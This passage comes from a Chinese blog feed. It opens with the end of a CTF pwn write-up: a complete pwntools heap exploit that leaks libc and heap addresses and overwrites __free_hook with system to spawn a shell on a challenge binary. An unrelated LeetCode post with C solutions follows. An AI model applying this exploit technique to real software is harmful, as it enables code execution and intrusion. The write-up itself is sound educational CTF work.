class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">[DEBUG] Received 0xf8 bytes:    00000000  5b 2a 5d 20  59 6f 75 20  68 61 76 65  20 32 20 64  │[*] │You │have│ 2 d│    00000010  61 74 61 62  61 73 65 20  6e 6f 77 2e  0a 46 6f 6c  │atab│ase │now.│·Fol│    00000020  6c 6f 77 69  6e 67 20 69  73 20 79 6f  75 72 20 64  │lowi│ng i│s yo│ur d│    00000030  61 74 61 62  73 65 73 3a  0a 0a 09 61  61 61 61 61  │atab│ses:│···a│aaaa│    00000040  61 61 61 0a  09 e0 1b 5c  41 a3 7f 0a  0a 43 68 6f  │aaa·│···\│A···│·Cho│    00000050  6f 73 65 20  79 6f 75 72  20 63 6f 6d  6d 61 6e 64  │ose │your│ com│mand│    00000060  3a 0a 0a 31  2e 20 43 72  65 61 74 65  20 61 20 6e  │:··1│. Cr│eate│ a n│    00000070  65 77 20 64  61 74 61 62  61 73 65 2e  0a 32 2e 20  │ew d│atab│ase.│·2. │    00000080  55 73 65 20  61 20 64 61  74 61 62 61  73 65 2e 0a  │Use │a da│taba│se.·│    00000090  33 2e 20 44  65 6c 65 74  65 20 61 20  64 61 74 61  │3. D│elet│e a │data│    000000a0  62 61 73 65  2e 0a 34 2e  20 4c 69 73  74 20 74 68  │base│.·4.│ Lis│t th│    000000b0  65 20 64 61  74 61 62 61  73 65 73 2e  0a 35 2e 20  │e da│taba│ses.│·5. │    000000c0  43 68 61 6e  67 65 20 74  68 65 20 6e  61 6d 65 20  │Chan│ge t│he n│ame │    000000d0  6f 66 20 61  20 64 61 74  61 62 61 73  65 2e 0a 36  │of a│ dat│abas│e.·6│    000000e0  36 36 2e 20  45 78 69 74  2e 0a 0a 59  6f 75 72 20  │66. │Exit│.··Y│our │    000000f0  63 68 6f 69  63 65 3a 20                            │choi│ce: │    000000f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将释放的堆全部申请回来，单独释放一个堆和<code>name</code>中指向的堆中指向的堆，以此泄露堆地址，因为后续改数据库名称时需要<code>name</code>中的内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\n'</span> <span class="token operator">+</span> <span class="token string">b'\t'</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改第三个数据库的名称为<code>free_hook</code>，此时修改的堆实际上已经被释放，因此能够改到<code>tcache</code>链表，需要注意的是数据路名称大小要是<code>0x90</code>，且改<code>free_hook</code>的时候<code>system</code>地址只能在后面否则会截断，因此要写入的地址是<code>free_hook - 0x88</code>，写入成功在创建一个<code>/bin/sh</code>并释放即可‘</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the value: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the new value: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"666"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_db</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the type of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">use</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_db</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_db</span><span class="token punctuation">(</span>orig_name<span class="token punctuation">,</span> new_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"5"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>orig_name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the new name for database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_name<span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>delete_db<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x98</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\n'</span> <span class="token operator">+</span> <span class="token string">b'\t'</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit_db<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook <span class="token operator">-</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete_db<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> oob </tag>
            
            <tag> envp </tag>
            
            <tag> tls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode刷题（持续更新)</title>
      <link href="/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/"/>
      <url>/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>算法算是从高三暑假就开始学了吧，但是后来学<code>pwn</code>之后也没时间学算法，学的一点也就应付一下数据结构与算法的期末考试有点用了…</p><p>为了提高编程和算法能力（混30分综测）准备开始刷题…目标是刷完<code>100</code>题！比起<code>Acwing</code>感觉<code>leetcode</code>难的多</p><p>上学期还说，用<code>C</code>打算法比赛的不是纯纯怨种吗，于是我来当怨种了（狗头）</p><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">两数之和</a></h2><p><strong>题目描述：</strong>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p><strong>思路1：</strong>双重循环暴力解</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123;    for(int i &#x3D; 0; i &lt; numsSize; i++)&#123;        for(int j &#x3D; i + 1; j &lt; numsSize; j++)&#123;            if(nums[i] + nums[j] &#x3D;&#x3D; target)&#123;                int* ret &#x3D; malloc(sizeof(int) * 2);                ret[0] &#x3D; i;                ret[1] &#x3D; j;                *returnSize &#x3D; 2;                return ret;             &#125;        &#125;    &#125;    *returnSize &#x3D; 0;    return NULL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路2：</strong>利用哈希表判断循环到的数之前的数中有没有与该数相加等于目标数的，没有就将该数加入哈希表，时间复杂度降为<code>O(1)</code></p><p>但是<code>C</code>语言的哈希函数所需头文件要自己导入，比赛的时候也没有，所以我就没写，就学习了一下思路</p><h2 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a><a href="https://leetcode.cn/problems/add-two-numbers/">两数相加</a></h2><p><strong>题目描述：</strong>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>考点大概就是链表操作吧…需要考虑进位和两个链表长度不同的情况</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2)&#123;    struct ListNode *ret &#x3D; NULL,  *curr &#x3D; NULL;    int cnt &#x3D; 0;    while(l1 || l2)&#123;        int val1 &#x3D; l1 ? l1-&gt;val : 0;        int val2 &#x3D; l2 ? l2-&gt;val : 0;&#x2F;&#x2F;其中一个链表空了就取值为0        int sum &#x3D; val1 + val2 + cnt;                if(ret &#x3D;&#x3D; NULL)&#123;            ret &#x3D; curr &#x3D; malloc(sizeof(struct ListNode));            curr-&gt;val &#x3D; sum % 10;            curr-&gt;next &#x3D; NULL;        &#125;&#x2F;&#x2F;为头结点赋值        else&#123;            curr-&gt;next &#x3D; malloc(sizeof(struct ListNode));            curr-&gt;next-&gt;val &#x3D; sum % 10;            curr &#x3D; curr-&gt;next;            curr-&gt;next &#x3D; NULL;        &#125;                cnt &#x3D; sum &#x2F; 10;&#x2F;&#x2F;计算进位        if(l1)              l1 &#x3D; l1-&gt;next;        if(l2)            l2 &#x3D; l2-&gt;next;    &#125;    if(cnt &gt; 0)&#123;        curr-&gt;next &#x3D; malloc(sizeof(struct ListNode));        curr-&gt;next-&gt;val &#x3D; cnt;        curr-&gt;next-&gt;next &#x3D; NULL;    &#125;&#x2F;&#x2F;两个链表均为空之后多出的进位    return ret;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="无重复字符的最长子串"><a href="#无重复字符的最长子串" class="headerlink" title="无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">无重复字符的最长子串</a></h2><p><strong>题目描述：</strong>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><p><strong>思路：</strong>滑动窗口，遍历每一位计算最长无重复字符的子串并记录最大长度</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int lengthOfLongestSubstring(char * s)&#123;    int len &#x3D; strlen(s);     int res &#x3D; 0; &#x2F;&#x2F;记录最大长度    for (int i &#x3D; 0; i &lt; len; i++) &#123;        int visited[128] &#x3D; &#123;0&#125;; &#x2F;&#x2F;用于判断是否有重复        int max &#x3D; 0;         for (int j &#x3D; i; j &lt; len &amp;&amp; !visited[s[j]]; j++) &#123;            visited[s[j]] &#x3D; 1;            max++;        &#125;        if (max &gt; res)             res &#x3D; max;    &#125;    return res;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="寻找两个正序数组的中位数"><a href="#寻找两个正序数组的中位数" class="headerlink" title="寻找两个正序数组的中位数"></a><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/description/">寻找两个正序数组的中位数</a></h2><p><strong>题目描述：</strong>给定两个大小分别为 <code>m</code> 和 <code>n</code> 的正序（从小到大）数组 <code>nums1</code> 和 <code>nums2</code>。请你找出并返回这两个正序数组的 <strong>中位数</strong> 。</p><p><strong>思路1：</strong>直接合并两个数组去中位数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">double findMedianSortedArrays(int* nums1, int nums1Size, int* nums2, int nums2Size)&#123;    int size &#x3D; nums1Size + nums2Size;    int q[size + 1], i &#x3D; 0, j &#x3D; 0, tmp &#x3D; 1;    while(i &lt; nums1Size &amp;&amp; j &lt; nums2Size)&#123;        if(nums1[i] &lt; nums2[j])            q[tmp++] &#x3D; nums1[i++];        else             q[tmp++] &#x3D; nums2[j++];    &#125;    while(i &lt; nums1Size)        q[tmp++] &#x3D; nums1[i++];    while(j &lt; nums2Size)        q[tmp++] &#x3D; nums2[j++];    if(size % 2)&#123;        return q[size &#x2F; 2 + 1];    &#125;else&#123;        return (q[size &#x2F; 2] + q[size &#x2F; 2 + 1]) &#x2F; 2.0;    &#125;&#125;<span aria-hidden="true" 